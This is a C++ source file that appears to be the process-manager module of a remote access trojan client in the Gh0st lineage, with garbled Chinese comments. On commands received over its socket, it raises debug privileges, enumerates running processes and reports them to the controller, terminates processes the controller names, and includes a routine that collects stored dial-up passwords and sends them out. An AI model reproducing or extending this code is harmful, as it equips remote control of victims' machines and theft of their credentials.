// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "CProcessManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount);

CProcessManager::CProcessManager(CClientSocket* pClient, BYTE bHow) : CManager(pClient)
{
	m_caseSystemIs = bHow;
	if (m_caseSystemIs == COMMAND_PROCESS)   //����ǻ�ȡ����
	{
		SendProcessList();
	}
}

CProcessManager::~CProcessManager()
{

}
void CProcessManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	SwitchInputDesktop();
	switch (lpBuffer[0])//�����ǽ��̹���������ݵĺ����� �ж����ĸ�����
	{
	case COMMAND_PSLIST:				//���ͽ����б�
		SendProcessList();
		break;
	case COMMAND_DIALUPASS:				//����20200530
		break;
	case COMMAND_KILLPROCESS:			//�رս���
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	default:
		break;
	}
}

void CProcessManager::SendProcessList()
{
	UINT	nRet = -1;

	//����getProcessList�õ���ǰ���̵����� --->lpBuffer
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;

	//���ͺ��� ���ຯ��send ���������Ľ������ݷ���
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);

}



//����20200530
void CProcessManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);

	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);

}


//��������
void CProcessManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	// ��Ϊ�����Ŀ��ܲ�ֹ��һ������������ѭ��
	for (int i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// ����Sleep�£���ֹ����
	Sleep(100);
	// ˢ�½����б�
	SendProcessList();
}

BOOL CProcessManager::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR            szDriveStr[500];
	TCHAR            szDrive[3];
	TCHAR            szDevName[100];
	INT                cchDevName;
	INT                i;

	//������
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//��ȡ���ش����ַ���
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if (!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//����
			{
				lstrcpy(pszNtPath, szDrive);//����������
				lstrcat(pszNtPath, pszDosPath + cchDevName);//����·��

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

BOOL CProcessManager::GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
	TCHAR        szImagePath[MAX_PATH];
	HANDLE        hProcess;
	if (!pszFullPath)
		return FALSE;

	pszFullPath[0] = '\0';
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, dwPID);
	if (!hProcess)
		return FALSE;

	if (!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!DosPathToNtPath(szImagePath, pszFullPath))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);
	return TRUE;
}

LPBYTE CProcessManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;	//���վ��
	HANDLE			hProcess = NULL;	//���̾��
	HMODULE			hModules = NULL;	//����ģ����
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = { 0 };	//��������
	LPBYTE			lpBuffer = NULL;				//
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;

	//��ȡȨ��
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	//����һ�����̿���
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);


	//����һ�»�����
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	//��������,����ƶ˹��е�ö�����ͣ���ʾ���ǽ��̵���������
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;

	//�õ���һ�����̣�����ʧ�ܾͷ���
	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			//�򿪽��̾��
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID != 0) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{

				//strProcessName[0] = '\0';
				//ö�ٵ�һ��ģ����
				//EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//������bug��û��Ȩ�޵�������޷���ȡ���������ƣ����Է��͹�ȥ������һ����������Ҳ��������ʼ��0����
				//���һ�ȡ�Ľ���·����û������ķ���ȫ�棬���������GetProcessFullPath������ע�͵���
				//��ȡ��������
				//GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//��ȡ��������
				GetProcessFullPath(pe32.th32ProcessID, strProcessName);

				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);


				//����memcpy�����򻺳����������� ���ݽṹ�� ����ID+������+0+����������+0
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		} while (Process32Next(hSnapshot, &pe32));//��һ������
	}
	//��lpbuffer�����������ȥ 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	CloseHandle(hSnapshot);
	return lpBuffer;
}

//��Ȩ
bool CProcessManager::DebugPrivilege(const char* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}
